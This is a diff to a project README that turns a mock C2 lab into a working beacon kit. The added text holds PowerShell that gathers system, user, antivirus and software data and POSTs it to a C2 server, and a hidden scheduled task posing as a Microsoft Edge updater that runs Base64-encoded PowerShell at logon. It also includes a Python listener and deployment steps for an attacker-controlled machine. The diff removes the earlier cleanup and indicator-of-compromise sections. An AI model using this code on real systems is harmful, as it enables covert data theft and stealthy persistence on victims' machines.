@@ -1,115 +1,151 @@
+# System Info Beacon with COM API Persistence
 
-# Mock C2 Server with PowerShell Beacon
+This project demonstrates a PowerShell-based system beacon that collects system information and persists via a hidden Scheduled Task using the COM API. The data is sent to a Command & Control (C2) server built using Python’s `http.server`.
 
-## Overview
-
-This project simulates a basic Command and Control (C2) infrastructure for educational or lab-based cybersecurity demonstrations. It involves a Python-based C2 server and a PowerShell-based beacon script that runs on the target machine, collecting system information and sending it back to the C2 server.
-
-> ⚠️ **Disclaimer:** This project is strictly for educational and research purposes in controlled environments. Do **not** use on unauthorized systems or networks.
+> ⚠️ **Disclaimer**: This project is for educational and authorized red team use only. 
 
 ---
 
-## Project Structure
+## Requirements
+2 Virtual Machines(VMs) are required for this demonstration:
+- One with Kali Linux/ ParrotOS or any Linux distro : To host C2 server
+- One with Windows 10 : To execute the Powershell Code
 
-```
-.
-├── beacon.ps1         # PowerShell beacon script
-├── c2_server.py       # Python HTTP C2 server
-└── README.md          # Documentation
-```
+## Features of Exploit
 
----
-
-## Prerequisites
-
-### On the C2 Server Machine (Attacker)
-
-- Python 3.x installed
-- Port 80 open and not in use (e.g., no Apache/Nginx running)
-- Optionally, run with `sudo` or Administrator if needed to bind to port 80
-
-### On the Target Machine (Victim)
-
-- Windows OS
-- PowerShell enabled
-- Administrator privileges to schedule tasks
+- Collects critical system metadata (hostname, IP, OS, user, AV, firewall, uptime, software list, etc.)
+- Posts data to a remote HTTP server endpoint
+- Creates persistent beaconing via a hidden Scheduled Task using the COM API
+- Uses Base64-encoded PowerShell for stealth
 
 ---
 
-## Setup & Execution
+## PowerShell Beacon Script
 
-### Step 1: Start the C2 Server
-
-1. Place `c2_server.py` on the server or attack machine.
-2. Run the C2 server:
-
-```bash
-python3 c2_server.py
-```
-
-You should see:
-```
-[+] C2 Server Running on Port 80...
-```
-
-> **Tip:** Use a static IP for the attacker machine (e.g., `192.168.1.193`).
-
----
-
-### Step 2: Deploy the PowerShell Script on Target
-
-1. Open `beacon.ps1` and make sure the IP address in the script matches the C2 server's IP.
-2. On the Windows target machine, run the script with elevated privileges:
+### One-Time System Info Beacon
 
 ```powershell
-powershell.exe -ExecutionPolicy Bypass -File .eacon.ps1
+$hostname = $env:COMPUTERNAME
+$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "169.*" -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
+$user = $env:USERNAME
+$os = (Get-CimInstance Win32_OperatingSystem).Caption
+$uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
+$av = (Get-CimInstance -Namespace "root/SecurityCenter2" -Class AntiVirusProduct | Select-Object -ExpandProperty displayName -ErrorAction SilentlyContinue) -join ", "
+$firewallStatus = (Get-NetFirewallProfile | Select-Object Name, Enabled | Out-String).Trim()
+$topProcesses = (Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 Name, CPU | Out-String).Trim()
+$software = (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object -ExpandProperty DisplayName -ErrorAction SilentlyContinue) -join ", "
+
+$payload = @{
+    Hostname  = $hostname
+    IP        = $ip
+    User      = $user
+    OS        = $os
+    Uptime    = $uptime
+    AV        = $av
+    Firewall  = $firewallStatus
+    Processes = $topProcesses
+    Software  = $software
+    Time      = (Get-Date).ToString()
+}
+
+try {
+    Invoke-WebRequest -Uri "http://192.168.1.193/collect" -Method POST -Body $payload -UseBasicParsing
+} catch {}
 ```
 
-What it does:
-- Immediately collects and sends system info to the C2 server.
-- Creates a scheduled task that re-runs the beacon on every logon.
+### Beacon Script for Logon Trigger
+
+Encapsulated in a Base64-encoded string for stealth and injected via COM API.
+
+### COM API-Based Persistence
+
+```powershell
+$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($beaconScript))
+
+$taskName = "MicrosoftEdgeUpdaterService"
+$taskDesc = "Microsoft Edge Telemetry Update"
+
+$service = New-Object -ComObject "Schedule.Service"
+$service.Connect()
+
+$rootFolder = $service.GetFolder("\")
+$taskDef = $service.NewTask(0)
+
+$taskDef.RegistrationInfo.Description = $taskDesc
+$taskDef.RegistrationInfo.Author = "Microsoft Corporation"
+
+$trigger = $taskDef.Triggers.Create(9)
+$trigger.UserId = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+
+$action = $taskDef.Actions.Create(0)
+$action.Path = "powershell.exe"
+$action.Arguments = "-NoProfile -WindowStyle Hidden -EncodedCommand $encoded"
+
+$taskDef.Settings.Enabled = $true
+$taskDef.Settings.Hidden = $true
+$taskDef.Settings.StartWhenAvailable = $true
+$taskDef.Settings.DisallowStartIfOnBatteries = $false
+
+$rootFolder.RegisterTaskDefinition($taskName, $taskDef, 6, $null, $null, 3, $null)
+```
 
 ---
 
-## Data Collection
+## Python C2 Server
 
-You will see logs like the following on the server console:
+Run this listener to receive and parse the beacon POSTs:
 
-```
-[+] Beacon Data Received:
-Hostname: DESKTOP-XYZ
-IP: 192.168.1.105
-User: alice
-OS: Microsoft Windows 10 Pro
-...
+```python
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import parse_qs, unquote_plus
+
+class C2Handler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        content_length = int(self.headers.get('Content-Length', 0))
+        post_data = self.rfile.read(content_length).decode()
+        parsed = parse_qs(post_data)
+        decoded = {k: unquote_plus(v[0]) for k, v in parsed.items()}
+
+        print("\n[+] Beacon Data Received:")
+        for key, value in decoded.items():
+            print(f"{key.capitalize()}: {value}")
+
+        self.send_response(200)
+        self.end_headers()
+
+def run(server_class=HTTPServer, handler_class=C2Handler, port=80):
+    server_address = ('', port)
+    httpd = server_class(server_address, handler_class)
+    print(f"[+] C2 Server Running on Port {port}...")
+    httpd.serve_forever()
+
+if __name__ == "__main__":
+    run()
 ```
 
 ---
 
-## Indicators of Compromise (IoC)
+## Execution
 
-The script sets up a scheduled task named:
+![image](https://github.com/user-attachments/assets/27a80367-d323-4dc8-9705-cc839ab66859)
 
-```
-MicrosoftEdgeUpdaterService
-```
+> Bottom half cut due to personal data(extracted by the exploit)
 
-Logs may be created in the Temp directory named `log.txt` (depending on the script version).
+## Deployment
 
-You may also notice HTTP POST traffic to the C2 server’s IP on port 80.
-
-![WhatsApp Image 2025-05-22 at 16 58 32_5d109823](https://github.com/user-attachments/assets/33b7a245-b152-46c9-9746-a763064779af)
-
----
-
-## Teardown / Cleanup
-
-### On Victim Machine:
-- Open Task Scheduler → Delete the task: `MicrosoftEdgeUpdaterService`
-- Delete the beacon script if still present
-
-### On Server:
-- Stop the Python script manually (Ctrl+C)
+1. Host the Python server on an attacker-controlled machine:  
+   ```bash
+   python3 beacon_server.py
+   ```
+2. Execute the PowerShell beacon script on the target.
+3. Beacon data will be received on the Python server.
 
 ---
 
+## References
+
+- Windows COM API for task scheduling
+- PowerShell Remoting and System Management Cmdlets
+- HTTP Beaconing Techniques
+
+---
